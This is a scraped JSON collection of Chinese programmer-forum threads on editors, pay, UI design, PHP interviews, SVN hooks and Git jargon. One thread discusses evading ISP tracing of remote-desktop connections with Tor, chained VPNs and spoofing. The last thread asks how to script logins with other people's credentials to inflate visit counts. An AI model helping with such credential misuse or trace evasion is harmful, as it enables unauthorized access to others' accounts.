如果解决了安全问题，客户只是阅读 那么 pdf chm 都是首选啊 不明白为啥非要编辑器", "typora", "可以做成静态资源站，然后 exe 用 nginx 之类的或 php 这类自带 本地 http web server 的就可以啦。\r", "\r", "然后写个 bat, 用户双击运行，第一步启动  web server ，第二步打开浏览器。", "好吧,我知道有一款, 完全符合楼主的需求 ", "還有這款, 功能強大 ", " gitbook 最近更新的版本简直不能用", "VSCODE?", "既然强调 多级目录 了, 我觉得 Atom 的目录层级应该能满足你.\r", "转到 VSCode 用了几天, 还是 Atom 的目录层级舒服", "试试 VSCode", "前面叫楼主试 VSCode 的，没发现截图就是么。。", " #11 \r", " #12 \r", " #13 \r", " #15 \r", " #16 \r", " #17 typora 似乎没有目录功能\r", " #18 \r", " #19 \r", " #23 \r", "\r", "感谢各位的参与和回答，目前准备试用 Madoko 和 Salmo ，这里尤其感谢 @", " 的推荐， Salmo 看起来最符合我的需求\r", ".md->.html->.chm 我看了下是可行的，但有些繁琐。哪怕是需要做一些细微的小修改就很麻烦\r", "这也是我为什么想要“编辑器”的原因，不仅方便，而且如果客户需要略作修改或注释的话，也不必再通过我，大家都省事儿\r", "楼上不少人建议我试试 Vscode ，其实正如\r", " #25 所说，我的截图就已经是了。 Vscode 需要安装，且启动速度慢，客户的电脑一般配置也不咋地，所以没有选择它\r", "\r", "再次感谢各位！", "Salmo 也是需要安装的呀, 类似的还有, BadWrite, ", " #27 唔……我本以为是绿色的……然后发现还不支持边写边预览……且没有高亮 QwQ", "notepad++装个插件都可以做到"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>做 Java 后端的，水平中上，普通本科， Github 上有一些小项目（合起来大概有几百个 star ），有个人 BLOG 。这样的水平在杭州和上海大概能拿多少工资？</p>\n</div></div>"], "reply": "2", "tittle": "大三实习生工资大概是多少？", "comment": ["5 左右吧", "留个同性交友链接"]},
{"content": ["<div class=\"topic_content\">没有学过设计，有没有什么容易上手的方式，让做出来的网页不那么难看呢</div>", "<div class=\"topic_content\">或者有什么基本布局，入门布局，配色指南可以参考吗</div>"], "reply": "66", "tittle": "不知道有没有什么办法，让程序员在制作网页或 UI 的时候，不那么难看", "comment": ["让女朋友在边上指导。", "学设计。😅\r", "用有设计感的前端框架。😂", "好问题，我也想知道答案。。。", "模板，狠狠地套上去。", "可以看看 material design", "楼主，先试一下 bootstrap 吧。", "推荐 Semantic UI", "狠狠地 margin", "试下 bootstrap 吧，还是不错的", "试试 material design 框架 ", "10 年踩坑经验：丑是天生的。放弃吧 LZ 。", "注意结构和空间感，元素和样式都不要太多，信息呈现区分主次\r", "\r", "最后大招：找张喜欢的壁纸图拉到 1600px 开高丝模糊当背景，内容合适的话考虑容器做 5%左右透明\r", "\r", "早年改了几行的 hexo 默认主题=>  ", "像素级借鉴", "我也想知道答案。。。", "花钱请个美工把界面设计好", "有个完整的前端框架。", "bootstrap+themeforest\r", "或者，你们公司没美工没 UI 么？！", "其实布局能弄好，再正常配色的话，应该都还可以，你能想象的到，我公司一个网站的整体设计都是我一个后端程序猿来做的么？不忍直视啊", " \r", "多年踩坑经验...我能在一个 winform 上摆上各种实用的功能,但经不过一个丑字.", " md 个人感觉还是要有点底子才能驾驭", "培养审美+学习配色", "UIkit 套上去就挺好看", "同求", "多去看艺术展览找感觉 + 学习一些成体系的理论比如色彩理论\r", "\r", "当然还是直接用别人写好的规范或者框架最省事", "设计好的 UI 和写代码本身就是矛盾, 想要做好看的效果, 需要更多的代码水平, 然后转念一想 降低一点要求其实也能实现功能了. \r", "所以就衍生出了 UI + 产品经理 + 程序员的结构.  UI 负责飞天, 产品经理负责落地, 程序员负责实现.  当 UI 飞出太空, 碰巧产品经理也在飞船里面的时候, 就是程序员骂娘的时候", "请个 UI", "难道不是直接买套自己喜爱的模板，然后看着改？让程序员和用户做交互，那简直太痛苦了，", "扒皮 略做修改 上线", "组件化的 UI 框架", "bootstrap 或者直接找模版，术业专攻，干嘛要让程序员搞设计", "bootstrap", "自用小项目，个人网站，不拿去卖钱的东西 -> bootstrap 套模板\r", "\r", "商业作品，公司项目 -> 不需要程序员负责外观，如果需要，请换公司", "material design", "bootstrap ，不是特别好看但至少风格是统一的。", "没效果图吗? 直接按照效果图开发啊.", "学习配色。很多丑都是因为配色不好。", "出规范，标注清晰", "没事，丑也可以丑出新高度", "每次以前搞设计的同事看到我的个人作品都要调侃一番，自从我学习了一段时间配色以后，他觉得我的 APP 能看了", "楼主以为 bootstrap 是用来干嘛的。", "丑是天生的 +1\r", "\r", "例如，即使是已经做了大量视觉效果和界面封装的 material design ，到不同的人手里做出来的效果也是天壤之别", "抄呗\r", "一模一样的抄", "别自己搞，普通人设计要钱，程序员设计要命", "bootstrap 这类前端库啊- -\r", "很多用 bootstrap 的原因就是  \r", "至少不会太丑", " 丑得有下限……", " UI 吧，比如像我这样的", " 终结此贴", "基本布局： bootstrap\r", "基本配色： ", "\r", "字体： google fonts 或者 Adobe fonts", "关键字: 前端 视觉设计 入门\r", "\r", "到最后无非就是排版布局配色规范化这些基本功. 如果已经用了一些比较成熟的前端框架的话, 基本配色和控件规范化这些细节已经不用我们去管理了, 剩下的就是排版了.\r", "一些平面设计的原理很适合借鉴, 可以找点书看看.", "遇到同样的问题  目前项目组没有 UI   前后台都是自己搞 前台搞出来怎么看怎么别扭 心累 自己都嫌弃自己", "还有 UI , 还有设计师 , 还有前端框架，还有主题模板，抢那么多人的饭碗不好吧？ ;-)", "模板啊", "想想也只要努力找一套能机械得用上去的模板, 避免自己做任何发挥, 这样犯错的可能性会尽量地少. 现实真的很吃亏, 每做一个决定, 都可能会在自己不知道的地方犯错, 真的够了.", "把设计 UI 的活外包给专业设计师呗～", "先从排版开始，强烈推荐：《写给大家看的设计书》！", "套框架啊,bootstrap,materailze 都好看的.", "网站给你了。。。 ", "  配色网站", "突然感觉码农好累，做出来还要不难看。加工期或者加钱不？", "我的经验是多看看设计师的设计，不用知道每个细节，掌握大概的流行方向，这样你用 CSS 框架来一个个组件搭起来也不至于是随便凑的", "学习一些基础的 typography 的知识。 Typography 是设计的骨架，把它设计好了（或者说不那么差），只要颜色不是特别特别特别不和谐，结果都不会太差。", "bootstrap 等各种框架严格按规则用不会太丑，但还是不会用的居多（摊手\r", "\r", "剩下的就只能交给审美了。个人感觉大多数前端设计丑的原因是 padding 不够。", "丑就丑 能用就行", "最好的办法就是先画出来……", "抽象思维和逻辑思维的冲突吧。不过自己的感受就是：要么有人画好给我照着弄 ，不然出来总是有莫名其妙的人跳出来说有意见的 。艺术就这尿性 没有正确答案。 后端比较好的就这点 和做数学很像 方法可以有多种 但是总是有优劣的。", "有什么办法能不让程序员制作网页或 UI", "学习设计，学习美感，学习色彩平衡\r", "最简单的方案：不要让程序员干 UI 的活"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近招人</p>\n<p>感觉传统的 PHP 面试题都太套路了</p>\n<p>求思路,有什么更合理的 PHP 面试题?</p>\n</div></div>", "<div class=\"topic_content\">招人的目标很简单,就想找到一个 1-2w 的,3 年左右经验 ,能写好代码,对新事物有好奇心 能学习的人.\r<br>通过 面试题 /笔试题 区分一个人能不能\"写出好代码\",我觉得比考一些 语言细节,跟\"回字有四种写法\"也差不多,没什么意义啊.</div>"], "reply": "72", "tittle": "求思路,一人说一个 PHP 的面试题吧", "comment": ["php 是不是最好的语言", "是的", "中国 PHP 作者是谁？在哪儿上班？", "你平时工作遇到的要想想的情况都可以问，比如\r", "我在数据库中存了很多到题目，然后管理员又有权限出比赛，可以把题目拉到比赛里，一个题目可以对应多个比赛，怎么做？这就问道了数据库多对多的实现。\r", "每场比赛有很多人参加，每个人都能看到自己参加的比赛提交记录，但是要把每场比赛和外面题库的提交记录分开，怎么做？这就问道了账号权限处理。\r", "每场比赛还有一个根据做出题的数量和罚时相关的实时更新的排名表，如果不是实时更新怎么处理，如果是实时更新怎么做最快？这就问了排序（静态）和二分（动态）。\r", "如果提交者交上来的是 sql 代码或者 js 代码怎么办？这就问道了 web 安全。\r", "假设提交者提交上来的是一个程序调用危险的系统调用怎么处理？这就问了系统安全。", "请面试官自己出题", "请面试官自己出题", "你最近看的一本 php 的书是什么？感觉怎么样？", "请出一个 PHP 的面试题 (笑)", " 我最近看的一本书叫做 php 7 天入门，看完这本书就来你这里面试了，至于感觉怎么样要看你录不录取我", "树上七个猴，地上一个猴。\r", "请拿 php 实现树对象，猴对象，要求树对象带可迭代接口，可迭代树上存在的猴；实现一个上树的接口，地上的猴可以上树。\r", "如果在迭代中间，地上的猴上树，如何保证迭代的正确性，空间的低复杂度。\r", "\r", "\r", "开个玩笑： P", " 被你逗乐的不行 wwwwwww", "php 的全称是啥？背着写出来。。。", "面 php 语言细节没啥用， php 本来就很简单。。。数据库遇到的问题，对 php 生态了解， redis/memcache ， http 后台那一套，安全， linux", "\r", "\r", "这个问题怎么样？", "手写冒泡算法", "请说出 PHP 5.2 5.3 5.4 5.5 5.6 7.0 7.1\r", "各两个相隔个版本的新特性和废弃的东西。", "你用 php 干过最开心的事情", " 这个比较典型", "$str = ", ";\r", "; ; //正则\r", "return preg_match(regex,regex,str)", " 这个💊\r", "能说出 5.4   5.6   7   之间就差不多了吧", "我司一般会出一个不太复杂的算术题，一小时内手写一个 Class 出来，大概 50 行左右，然后上机跑得通。", "late static binding 和 使用生成器遍历数据库，居然没人懂……", "请问有比 PHP 更好的语言吗？请列举", "低级：描述一下最近印象最深的解决的问题？\r", "中级：让你主导项目你会选什么框架？\r", "高级：如何提高团队整体的编码质量？", "发现问题，分析问题，解决问题，甩个问题给他。", "  还真被拉着手写过", "& 的具体意思,例如 23&1 的结果.", " 这题一出，面试者就哭了。。。", "请写出 PHP7 语言的 BNF 范式", "\r", "\r", "昨天刚看到的一个关于面试的博客，能笑死人", "考语言特性的话，可以问下 class 中，$this 、 self 、 static 的区别。\r", "也可以试下让面试者描述下怎么用 redis 实现个简单的 counter 或锁，还有优缺点", " 23333333", "让面试者出一道自己认为是他水平的题，然后解释出详细思路（加手写代码） 233333", "世界上最好的语言______________(100 分)", "```\r", "    $arr = [1,2,3];\r", "    foreach($arr as &$v) {\r", "        //nothing todo.\r", "    }\r", "    foreach($arr as $v) {\r", "        //nothing todo.\r", "    }\r", "    print_r($arr);\r", "```\r", "结果？", " php 是世界上最好的语言!怎么能还有比他更好的 呢!这不是来找事情吗?23333", "反转单向链表", " Java", "基于 php 的应用场景，面 php 和语言没啥大关系。\r", "\r", "标准库\r", "网站基础架构\r", "各种基本概念\r", "网站安全处理\r", "各种 sql/nosql/缓存的使用经验\r", "request/response 的常见 header\r", "\r", "差不离了。", "简述 yii 的 Behavior 绑定原理， laravel 的 ioc 原理\r", "好多人连自己天天用的框架源代码也没看过", "1.说一说什么是静态后期绑定\r", "2.接口 Interface 的作用\r", "3.封装继承抽象是什么意思,php 如何表现\r", "4.影响 php 性能的几个方面\r", "5.说说对 php gc 的理解\r", "6.如何改变匿名函数 Closure 的作用域\r", "7.php7 了解多少 以及你对哪个新特性最感兴趣\r", "8.cookie/session 的生命周期\r", "9.什么情况下设置 header 头会失效\r", "10.ob_start 系列的作用,以及在项目中都怎么用过\r", "11.如果给 yii/tp/加上一个注释 Annotation 路由你该如何实现\r", "12 !empty($varable)和 isset($varable)的区别\r", "13 请说出几种接受外部变量的方式\r", "14.说说从 nginx 接受请求到 php 输出内容，期间都经过了什么", "如何防止 SQL 注入\r", "如何防止 XSS 注入\r", "如何防止 CRSF", " 正解", " 我面 10 个有九个半没看过  所以无奈了.大部分都是用 TP \r", "小公司招人痛苦啊...", " 感谢,很有启发意义.", " 确实是这样.来面试的 谁还不会写 PHP,太偏的 PHP 技巧我也不会问\r", "然而来面试的人基本上就把自己定义为\"写 PHP 的\",除了 PHP 别的基本懒得看也不懂的水平...", "php 是最好的语言吗。另广州招 PHP ，看我信息", "sql 注入防了半天 还是被干。\r", "各大网站被爆哭是什么情况。", "楼主在哪里 感觉我挺符合的", " 再 nb 的注入也经不起接收外部变量拼 sql", "PHP 就是最好的语言，谁不承认就是不客观。\r", "手动微博摊手表情", " 41204034 欢迎 qq 骚扰", "  我司北京 不好意思", "手写单链表逆向打印", "我是写 PHP 的，防 SQL 这些交给 WAF 哈哈 ，", "另外可以自己搜 PHP Certification 题库\r", "能解决那些稀奇古怪的题目，并不代表日常的代码水准就高\r", "另外可以扩展一下，考校一些 Git 、 Linux 的常用命令", "咳咳 我先标记下  说不定有用", " 笑死我了", "楼主是医疗的？", "不使用递归的情况下实现无限层级的类别展现", " php 还不可以使用注释来注入依赖什么的吧", "什么是面向对象编程\r", "什么是面向工资编程", "直接问 PHP 7.0 更新了什么 feature ？=。=", " 这个好", " 早就可以了 用反射获取注释 正则匹配指令 路由注释 Symfony2 已经实现了", "把我招了吧  哈哈哈", "面试不问细节，不问奇葩算法，这些东西就算不会自己上网一搜随便看看就明白，当然太简单的那种基本算法可以问问，不需要实现，比如排序啊之类好歹你大概知道有几种方法都叫啥名，到时候搜你也得知道关键词，不用考具体实现\r", "\r", "然后，聊聊 http 模型， fastcgi 处理模型，确定基本问题知道在哪，常用的 MYSQL 大坑是否了解，比如 LIMIT 很大数字会慢这种常识，细节见镇长\r", "\r", "然后，聊聊各种数据安全问题，防止泄露的处理，常见业务大坑比如支付网关返回只验证订单号成功不验证金额的这种事儿怎么看之类\r", "\r", "然后，针对 PHP ，问问 5.X 到 5.6 有啥主要变化，新特性简单了解即可，日常能用到的会出现不兼容问题的为重点，然后是 5.6 到 7 有啥重点需要注意的地方之类，重点在代码题\r", "\r", "\r", "\r", "代码题：\r", "\r", "给定时间(4 小时内)处理一个基本业务数据逻辑，环境在测试服务器搭好， git 推上去自动部署，要求每秒钟几万次的请求（另外测试服务器有一个 golang 客户端可以用来模拟）\r", "\r", "给定的自己写的变种 CI 框架，包含公司一部分已经写好的模块可以直接调用，提供框架完整中英文手册，以及一部分同类别人写的类似功能源代码可以参考使用语法，核心逻辑部分，需要从 session 中获取几个参数，从 cookies 中获取几个参数，从 post 获取几个参数，然后代入数据库，交叉 N 个表\r", "\r", "需要写的是一个登陆并维持状态（界面不要求，白页 input ，白页显示即可），然后获取一个关联系统预设的 cookies ，一个用户主动的 post 数据，几个 url 上带来的算是 get 的参数，然后结合这些去数据库按照三个规则查询生成 table 显示给用户（三种简单逻辑但是结合数据库结构考虑性能就不太好搞的逻辑），还有一个 ajax 入库的 api 接口\r", "\r", "这个规则里会设计一个表格的变换，给定较大压力下， PHP 模块都配置好，包括 redis ， memcached 缓存都带配置好的服务器，在框架手册里会写明可以直接用。测试压力调度器可以随时让他测试自己的性能，约定题目会告诉你生成永久临时辅助查询表需要书写临时表数据定义文档上传版本库，对表结构进行调整、建立索引需要修改版本库中的数据库定义文档（暗示可以对进行修改的范围）\r", "\r", "一般熟练工， 30~50 分钟就能写完，然后考核代码质量\r", "\r", "首先那个生成报表的，需要给数据库加索引，如果稍微高级点的，会考虑生成一个辅助列（触发器）甚至辅助表去把查询拆分成简单查询几倍提高性能\r", "\r", "然后，处理查询部分， stmt ， activerecord 之类可以自选，具体怎么去处理三个查询中的两个用现有表结构很难简单弄出目标数据的方式的巧妙程度需要观察，这是技术硬实力\r", "\r", "另外就是输入过滤，对于系统内约定的传进来 int ，有没有随手 intval 一下的习惯，对于用户数据（比如 cookies ）是否有随手 intval 的习惯等等\r", "\r", "这些都处理得很厉害，加分点众多，基本日常写业务基本无敌了", " \r", "很详细啊,多谢了\r", "然而现实情况是,我也不敢问细节  就一些面上的东西,怎么看负载查找文件的命令啊,http 头里面有啥字段啊,session 过期咋整啊 这些问题,对方都是一脸蒙逼的状态,很多 3-5 年经验的人,不知道他们天天都在干啥  写了三年后台也不至于啊.", " 你说的这些全部都会的工资至少要 20k+了", " #69 \r", "招聘职位是高级 PHP 工程师的 难道 20K+不是基本盘么？", " 这个值啊", "不过大多数公司 RD 没有创建触发器的权限吧"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近找到几个比较有趣的计算机入门学习网站，涉及编程、云计算等领域，感兴趣的可以去看一下，希望能帮助大家让枯燥的学习变得有趣。</p>\n<ol>\n<li><a href=\"http://code.org\" rel=\"nofollow\">code.org</a></li>\n</ol>\n<p>进行编程学习的网站，主推项目之一是“一小时编程”，将会面向全世界开放并推广，而且不会针对任何特定的等级水平，处于任何年龄段、任何学习阶段的孩子都能通过 <a href=\"http://Code.org\" rel=\"nofollow\">Code.org</a> 学习编程，比较简单。</p>\n<ol>\n<li>计蒜课 <a href=\"https://www.jisuanke.com/\" rel=\"nofollow\">https://www.jisuanke.com/</a></li>\n</ol>\n<p>计蒜客（原名泡面吧）是学习计算机相关领域知识(编程、算法、开发、计算机理论)最便捷的渠道,其趣味盎然的交互方式让你可以和朋友一起轻松学习。也是编程学习。</p>\n<ol>\n<li>云中沙箱 <a href=\"http://lab.aliyunedu.net\" rel=\"nofollow\">http://lab.aliyunedu.net</a></li>\n</ol>\n<p>云计算学习的网站，是阿里云官方的实验平台，最大的亮点是，直接为学员配置好阿里云的云主机，通过虚拟的实验环境，可边看实验手册边动手操作，很方便。</p>\n<p>4.mooc 学院</p>\n<p>MOOC 是果壳网旗下开设的在线课程网站，有固定的开课时间，有作业有考试，考试通过后会授予证书。除计算机外的各类课程也都有，想学哪个都可以报名参加。</p>\n<ol>\n<li>我要自学网</li>\n</ol>\n<p>这个网站也是什么课程都有，有很多感兴趣的课，基础类课程较多，比较适合初学者。就是之后需要 V 币什么的。</p>\n</div></div>"], "reply": "5", "tittle": "推荐几个有趣的计算机入门学习小站～", "comment": ["我就说怎么没人回复，原来你是昨天才注册的账号。", "推荐的网站资源不错，排版有点问题", "11141 ，我的数学是体育老师教的吗？", "都是不错的学习网站，很有帮助，已收藏。", "才发现号排错了。。。我不是故意的=_="]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>提交报这个错误<br>\n<img src=\"http://wx3.sinaimg.cn/mw690/62c5393fgy1fcx1rtsd41j20e703ujrf.jpg\"><br><br>\n配置<br>\n<img src=\"http://wx2.sinaimg.cn/mw690/62c5393fgy1fcx1rtj9btj20fg059dfq.jpg\"><br><br>\n<img src=\"http://wx3.sinaimg.cn/mw690/62c5393fgy1fcx1rt1r1dj20b804tq2t.jpg\"><br><br>\n<img src=\"http://wx2.sinaimg.cn/mw690/62c5393fgy1fcx1rs8odvj208b05qt8j.jpg\"><br></p>\n</div></div>"], "reply": "10", "tittle": "VisualSVN Server 配置钩子提交不成功？", "comment": ["有人知道是为什么吗？", " #1 这个钩子主要是想实现什么功能呢?", " 提交自动同步到线上测试环境", " #3 随便试了试, 感觉运行正常啊... 不知道你那里为什么有问题. 我觉得我完全抄的是你的代码", "我写的代码:\r", "\r", " off\r", "set REPOS=%1\r", "set REV=%2\r", "\r", "set SVN=\"C:\\Program Files\\VisualSVN Server\\bin\\svn.exe\"\r", "set DIR=%REPOS%/hooks\r", "set WORKING_COPY=D:\\forV2\r", "set PATH=%PATH%;\r", "\r", "svn update %WORKING_COPY%", " D:\\forV2 你这个里面的代码是 svn 拉取的吗？方便的话加下我 QQ925616684", " #6 我想的是从 A 文件夹上传, 然后钩子自动去更新 B 文件夹. D:\\forV2 就是这个 B 文件夹.\r", "\r", "不过的确有点奇怪, 昨天我在家里测试的时候 OK, 今天换了公司电脑就更新不了了, 但是报错跟你也不一样.", " ", " 这个靠谱", " #8 果然好了. 虽然已经感觉到是什么地方的权限出问题了, 可是没想到居然是在这里修改.", " 恩，也是搞了好长时间。哈哈"]},
{"content": ["<div class=\"topic_content\">问一个安全问题。\r<br>\r<br>我想在本地通过 3389 远程连接到一台国外 Win 主机， ISP 会知道我连接的这台机器的 IP 吗？\r<br>\r<br>在知道国外主机 IP 的情况下，但是没有国外主机里面的日志数据，这种情况下，通过 IP 能查到谁连接过吗？</div>"], "reply": "55", "tittle": "请问 3389 远程连接， ISP 会知道我连接的 IP 吗？", "comment": ["应该会吧。连接的什么 IP ，走的什么端口是能看到的吧。\r", "\r", "改个 3389 端口？走个 VPN ？", "1. 知道目的 IP 和端口\r", "2. 技术上查得到是谁（定位到实名）连的\r", "3. 是否会记录 1 和 2 的信息，存多久，不知道", "当然知道", "技术上是可行的", "肯定可以啊。所以你连到国外的 3389 后，继续再这台连国外的 3389 。", " 那 ISP 能查到我连接的 VPN 的地址吗？", " 貌似只有这个办法了", " 那你知道通常咖啡馆的摄像记录会存多久数据啊", " 你不如用 wifi 万能钥匙 打一炮换个地方", " 貌似没有 PC 或 MAC 版", "wifi 万能钥匙 在这里只是一个密码获取工具， root 以后的手机可以看密码。", "另外，匿踪是个很大的学问。不是几句话能整明白的。", "上 tor 或者多层 vpn 吧", " tor 是这个吧？ \r", " 是的", "要想知道轻松就能知道 o(︶︿︶)o", "怎么感觉 LZ 是个有故事的同学.. 说来听听？", "不管 3389 还是 VPN 都会知道\r", "3389 和 VPN 不是隐匿技术，是加密技术.\r", "网络上的骨干节点路由会保存日志 30 天 :)\r", "the big brother is watching you", "上套（ tor ）吧", "运营商日志至少有 30 天", "LZ 说出你的故事", "  被折腾了， lz 。就这样给你说 只要你人在国内，随便你什么 tor vpn ，只要想查，没有查不到的", "LZ 是要干坏事啊，我给你说个故事，从前有个人搞黑产，拨了 5 层代理，一样被抓 ", " ", "当然知道，如果不知道你怎么连的通啊。", "RDP 协议啊！", " 多层代理。 3 虚拟机。流量混淆。。", "真要做到网络匿名是成本非常高的，从硬件到软件一个环节都不能有岔，同时你还得忍住各种念头。", "LZ 来一段啊", "运营商会记录你获取过的所有 IP ，连接过的所有 IP 。\r", "而且记录时长很久，不然网警要找他们查时没记录了就麻烦了……", " 问一下 3389 端口是什么梗啊？", " 3389 就是 windows 的 remote desktop connector 协议所使用的默认端口。", "网址都贴出来了，这个帖可以进 chamber 了", " 代指远控", "楼主可以阅读以下 whonix 的文档，里头讲的还是很详细的。\r", "\r", "关于匿名里头有详细的讲解", "那啥。。运营商流量有磁带备份的。。", "顺带说下，楼主不管拨了几个 vpn ，跳了几层跳板，只要电脑里有 360 ， qq 等类似国产软件，都是无用功", "通常咖啡馆的摄像记录会存多久数据。。\r", "这种问题 001-110 来一发", "好好活着不好么?", "楼主 别动了歪念头啊～～", " 这条信息太重要了，感谢\r", "\r", "我已经决定肉身翻墙，然后再安装 whonix", "技术上是可以的，不仅 IP ，连你的 mac 都知道。", " macbook 用 wifispoof \r", "是不是可以防止 mac", "lz 这是想干什么坏事啊……", "现在加密协议这么多，具体的信息内容不容易解密。但是 TCP 连接信息是一个非常重要的网络诊断信息，记录下来很正常。有谁不会这么做吗？\r", "\r", "LZ 的使用场景可以了解下：\r", "\r", "1. ", "\r", "2. ", " (我们开发的)", "那么问题来了，楼主到底准备做什么呢？", " 这个技术太高深了，我是技术小白", "想做到完全匿名，我觉得要做到双重人格，所有可能与身份相关的东西要从匿名开始。\r", "\r", "要不然稍有不慎，就留有后患，可能你某个不经意的回帖，之后就暴露了。（前几天看一本书上，讲 FBI 找到丝绸之路的管理员，就因为从一个回帖开始的）", "tor 应该是没法查的。只要你不搞出个大案出来。。\r", "按道理 vpn/ss 到国外 vps A 再从 A 到国外 VPS B ，就已经不好查了。。\r", "\r", "所以查不查你完全看你捅的娄子够不够大。。", " \r", " \r", " \r", "《中华人民共和国网络安全法》\r", "第三章  网络运行安全\r", "第一节 一般规定\r", "第二十一条  国家实行网络安全等级保护制度。网络运营者应当按照网络安全等级保护制度的要求，履行下列安全保护义务，保障网络免受干扰、破坏或者未经授权的访问，防止网络数据泄露或者被窃取、篡改：\r", "（一）制定内部安全管理制度和操作规程，确定网络安全负责人，落实网络安全保护责任；\r", "（二）采取防范计算机病毒和网络攻击、网络侵入等危害网络安全行为的技术措施；\r", "（三）采取监测、记录网络运行状态、网络安全事件的技术措施，并按照规定留存相关的网络日志不少于六个月；\r", "（四）采取数据分类、重要数据备份和加密等措施；\r", "（五）法律、行政法规规定的其他义务。\r", "----\r", "是六个月哦！", " 呵呵，将来可能用到", " 多谢提醒", "就和很多人去北京也没被半路截下来，而有些人一出本市就会有人拦截一样，关键看你出去干啥还有你的重要性。", " 我记得是在 apple 上买东西被苹果卖了", " 苹果会记录谁买了哪台电脑？\r", "\r", "根据 mac 地址，苹果可以查到谁买了这台电脑？", " 买软件还是啥"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>先说下我常见／常用的：</p>\n<ul>\n<li><strong>WIP</strong> <em>  Work In Progress</em> 开发中</li>\n<li><strong>LGTM</strong>  <em>Looks Good To Me</em> Riview 完别人的 PR ，没有问题</li>\n<li><strong>PTAL</strong> <em>Please Take A Look</em> 帮我看下，一般都是请别人 review 自己的 PR</li>\n<li><strong>CC</strong> 是好像是通知别人的意思，不知道是什么的缩写</li>\n</ul>\n<p>搜到一篇相关文章：\n<a href=\"https://medium.freecodecamp.com/what-do-cryptic-github-comments-mean-9c1912bcc0a4\" rel=\"nofollow\">What do cryptic Github comments mean?</a></p>\n<pre><code>LGTM  —  looks good to me\nACK  —  acknowledgement, i.e. agreed/accepted change\nNACK/NAK — negative acknowledgement, i.e. disagree with change and/or concept\nRFC  —  request for comments, i.e. I think this is a good idea, lets discuss\nWIP  —  work in progress, do not merge yet\nAFAIK/AFAICT  —  as far as I know / can tell\nIIRC  —  if I recall correctly\nIANAL  — “ I am not a lawyer ”, but I smell licensing issues\n</code></pre>\n</div></div>"], "reply": "24", "tittle": "你平时在使用 Git 团队协作中经常使用哪些术语？", "comment": ["CC 是 Carbon Copy 的意思。\r", "我觉得还是尽量少用缩写为好。 CC 是因为邮件经常用，所以广为人知，这个缩写可用。 WIP 貌似是 git stash 的默认信息带了？那也可用。\r", "其他的还是少用。", "GG ：完了，跪了，黄了\r", "AFK ：老子不干了", "开始变基", "尽量不要用英语缩写，除非是广为人知的。", "CC 是抄送的意思吧？", "我们连 git 都读成句特，进来读对的人全部被带歪。", "WTF", "SOS", "我们的术语是：不准写缩写。", " 2333 ，别是一道风景", " 可以试一下，用用就习惯了", "看到缩写，新员工只想说 WTK.", "Feels Uncomfortable Coding with Keyboard", "楼主说的缩写我一个也不懂，是我孤陋寡闻了？", " 用意念！", "dibs\r", "声明这个 issue 我来负责\r", "/w\\", "WTF", "WIP ， LGTM ，用 Gerry 常用。", "还见过 Git 念成 gayt 的", " 江西还有广东那边的都这么读。。 4G 读成 4 居", " #20 \r", "好奇 4G 如果不读“ 4 聚”应该怎么读", " 念 zhei 吧", "fix\r", "feature\r", ".....", " 短音 i 和 ei 的区别呗 感觉只要能把 give 读对的人 应该问题不大啊"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>Python</h2>\n<ol>\n<li>《 Python 核心编程（第 3 版）》</li>\n<li>《 Python Web 开发实战》</li>\n<li>《 Python 核心编程（第 3 版）》</li>\n<li>《 Python 编程（第 4 版 套装上下册）》</li>\n<li>《 Python 高效开发实战： Django 、 Tornado 、 Flask 、 Twisted 》</li>\n<li>《从 Python 开始学编程》</li>\n<li>《 Python Cookbook （第 3 版）中文版》</li>\n<li>《深入理解 Flask 》</li>\n<li>《编写高质量代码：改善 Python 程序的 91 个建议》</li>\n<li>《 Effective Python ：编写高质量 Python 代码的 59 个有效方法》</li>\n<li>《 Flask Web 开发》</li>\n</ol>\n<h2>网络</h2>\n<ol>\n<li>《 TCP/IP 详解 卷 1 ：协议（原书第 2 版）》</li>\n<li>《图解 TCP/IP 第 5 版》</li>\n<li>《图解 HTTP 》</li>\n<li>《 HTTP 权威指南》</li>\n</ol>\n<h2>数据库</h2>\n<ol>\n<li>《 MySQL 技术内幕（第 5 版）》</li>\n<li>《高性能 MySQL （第 3 版）》</li>\n<li>《高可用 MySQL （第 2 版）》</li>\n<li>《 MySQL 技术内幕： InnoDB 存储引擎（第 2 版）》</li>\n</ol>\n<h2>系统</h2>\n<ol>\n<li>《 UNIX 环境高级编程（第 3 版）》</li>\n<li>《深入理解计算机系统（原书第 3 版）》</li>\n</ol>\n<p>开发语言主要是<code>Python</code>，然后慢慢深入，全面学习，来聊聊你觉得必看的书籍把。</p>\n</div></div>"], "reply": "6", "tittle": "有哪些书籍是一个合格的程序员必读的？", "comment": ["我来列几本语言无关的吧：\r", "《计算机程序的构造和解释》\r", "《整洁代码》\r", "《程序员的职业素养》\r", "《重构》\r", "《算法（第四版）》", "程序员的三种境界： ", "《颈椎病康复指南》算么", "《养生之道》", " 《养生之道》+1", " 这些算是修外功的吧"]},
{"content": ["<div class=\"topic_content\">手上有一些 <a target=\"_blank\" href=\"http://www.fjedu.cn\" rel=\"nofollow\">www.fjedu.cn</a> 的登陆账号密码，想要逐个登陆然后点击我自己的空间刷访问量（只认登陆用户的访问量）。\r<br>先想的时候抓一下 post 的数据然后模拟 post 函数登陆成功之后 get 我自己的空间地址。\r<br>\r<br>查了一番百度之后开始实践（我是小小白，这方面完全不懂）\r<br>\r<br>抓包的时候 post 里面数据： <a target=\"_blank\" href=\"http://www.fjedu.cn/index.php?r=portal/user/doLogin&amp;ajax=1&amp;callback=jQuery172039307714360113355_1487775839817\" rel=\"nofollow\">http://www.fjedu.cn/index.php?r=portal/user/doLogin&amp;ajax=1&amp;callback=jQuery172039307714360113355_1487775839817</a>  有回调 callback 函数 ，每一次都不一样。就不知道怎么构造 post 函数了。\r<br>或者有另辟蹊径的方法吗？</div>"], "reply": "2", "tittle": "想给学校的空间刷访问量。post 自动登录功能实现上受挫。求指教。", "comment": ["有没有程序员", "jsonp?"]},
